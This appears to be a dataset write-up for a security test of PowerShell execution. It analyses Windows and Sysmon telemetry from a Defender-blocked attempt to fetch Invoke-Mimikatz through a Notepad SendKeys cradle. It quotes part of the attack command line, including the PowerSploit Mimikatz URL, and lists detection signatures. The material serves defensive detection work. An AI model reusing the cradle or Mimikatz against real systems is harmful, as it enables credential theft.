# T1059.001-4: PowerShell — Mimikatz - Cradlecraft PsSendKeys

## Technique Context

T1059.001 PowerShell execution encompasses adversaries leveraging PowerShell for various malicious activities. The "Mimikatz - Cradlecraft PsSendKeys" variant represents a sophisticated technique that attempts to download and execute Mimikatz through an indirect method involving Windows UI automation. This approach uses PowerShell to:

1. Manipulate Windows applications (Notepad) through COM objects and SendKeys
2. Download Mimikatz payload from a remote URL
3. Execute credential extraction functionality through invoke-mimikatz

The detection community focuses heavily on PowerShell-based attacks due to their prevalence in post-exploitation activities, particularly credential harvesting attempts. This technique is notable for its attempt to evade direct network-based detection by using legitimate Windows applications as intermediaries for payload retrieval.

## What This Dataset Contains

The dataset captures a failed execution attempt that was blocked by Windows Defender. Key evidence includes:

**Process Execution Chain**: Security events show the parent PowerShell process (PID 19868) spawning from another PowerShell instance, with the complete command line visible in Security event 4688: `"powershell.exe" & {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');...}`

**Process Termination with Access Denied**: The PowerShell process attempting to execute the technique terminated with exit code `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution.

**Sysmon Process Access**: Event ID 10 shows PowerShell accessing whoami.exe with full access rights (`GrantedAccess: 0x1FFFFF`), indicating the script successfully launched the discovery component before being blocked.

**CreateRemoteThread Detection**: Sysmon event ID 8 captures PowerShell attempting remote thread creation in an unknown process (PID 18360), likely part of the injection attempt.

**Limited PowerShell Script Block Logging**: The PowerShell channel contains only standard test framework boilerplate (Set-StrictMode, Set-ExecutionPolicy Bypass) rather than the actual malicious script content, suggesting the technique was blocked before substantial script execution occurred.

## What This Dataset Does Not Contain

The dataset lacks several elements due to Windows Defender's intervention:

- **No Mimikatz Payload Execution**: The technique was blocked before the invoke-mimikatz functionality could execute, so there's no evidence of actual credential extraction
- **No Network Connections**: Sysmon network events are absent, indicating the URL download was prevented
- **No Notepad Process Creation**: The COM-based Notepad manipulation didn't progress to actual process creation due to early blocking
- **Limited Script Block Content**: PowerShell script block logging doesn't capture the full malicious payload, only framework initialization code

The sysmon-modular ProcessCreate filtering explains why we don't see additional process launches beyond whoami.exe, which was specifically included due to its classification as a discovery technique.

## Assessment

This dataset provides excellent evidence of attempt-based detection opportunities but limited visibility into the technique's full execution. The Security channel's command-line logging proves invaluable, capturing the complete attack payload even when execution fails. The combination of Sysmon process access events, remote thread creation attempts, and process termination with access denied creates a strong detection profile.

The data quality is high for understanding the initial attack vector and technique identification, though it doesn't demonstrate the technique's full capabilities due to effective endpoint protection intervention. This makes it particularly valuable for defenders to understand what successful blocking looks like in telemetry.

## Detection Opportunities Present in This Data

1. **PowerShell Command Line Analysis**: Monitor Security event 4688 for PowerShell processes with command lines containing Mimikatz-related URLs, particularly PowerSploit GitHub repositories and invoke-mimikatz references.

2. **Process Termination with Access Denied**: Correlate Security event 4689 exit status `0xC0000022` with PowerShell processes executing suspicious command lines to identify blocked credential extraction attempts.

3. **COM Object Creation Patterns**: Detect PowerShell processes loading specific .NET assemblies (`System.Windows.Forms`) combined with WScript.Shell COM object creation, indicating UI automation techniques.

4. **Process Access to Discovery Tools**: Alert on Sysmon event ID 10 showing PowerShell accessing system discovery binaries (whoami.exe) with full access rights, especially when combined with suspicious parent command lines.

5. **CreateRemoteThread from PowerShell**: Monitor Sysmon event ID 8 for PowerShell processes creating remote threads in unknown or system processes, indicating potential injection attempts.

6. **Registry Manipulation Patterns**: Look for command lines referencing `HKCU:\Software\Microsoft\Notepad` combined with Mimikatz-related indicators, suggesting cradlecraft techniques.

7. **URL Pattern Matching**: Create signatures for the specific PowerSploit GitHub URL structure used in this technique, including the commit hash pattern in the URL path.

8. **Failed Execution Correlation**: Combine multiple weak signals (process access, thread creation attempts, access denied termination) into high-confidence alerts for blocked advanced techniques.
